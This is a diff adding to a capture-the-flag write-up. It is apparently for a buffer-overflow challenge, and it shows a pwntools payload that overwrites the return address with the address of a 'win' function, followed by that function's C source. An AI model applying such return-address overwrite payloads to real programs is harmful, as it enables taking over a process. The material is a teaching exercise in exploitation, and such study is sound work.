@@ -269,3 +269,31 @@ pwndbg> disassemble win
 Dump of assembler code for function win:
    0x08049296 <+0>:     endbr32
 ```
+
+```python
+from pwn import p32
+import sys
+payload = b"A"*112 + p32(0x08049296)
+sys.stdout.buffer.write(payload)
+```
+
+This jumps to the win function but segfaults. Let's look at the win function:
+
+```c
+void win(unsigned int arg1, unsigned int arg2) {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  if (arg1 != 0xCAFEF00D)
+    return;
+  if (arg2 != 0xF00DF00D)
+    return;
+  printf(buf);
+}
+```
